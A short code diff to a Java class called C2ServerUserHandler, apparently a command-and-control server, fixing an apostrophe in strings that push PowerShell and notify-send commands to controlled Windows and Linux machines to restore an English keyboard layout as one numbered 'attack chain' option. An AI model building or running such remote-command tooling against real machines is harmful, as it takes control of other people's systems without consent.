@@ -448,11 +448,11 @@ public class C2ServerUserHandler implements Runnable{
                     windowsCommands = "";
                     windowsCommands += "Set-WinUserLanguageList en-US -force;";
                     windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
-                    windowsCommands += "[System.Windows.MessageBox]::Show('Sorry about that here's english')";
+                    windowsCommands += "[System.Windows.MessageBox]::Show('Sorry about that heres english')";
 
                     // Linux
                     linuxCommands = "";
-                    linuxCommands += "notify-send 'Sorry about that here's english'";
+                    linuxCommands += "notify-send 'Sorry about that heres english'";
                     linuxCommands += "setxkbmap en;";
                     // TODO Figure out how to mess with Linux Keyboard
                 } else if (userAttackChainChoice.equals("5")){
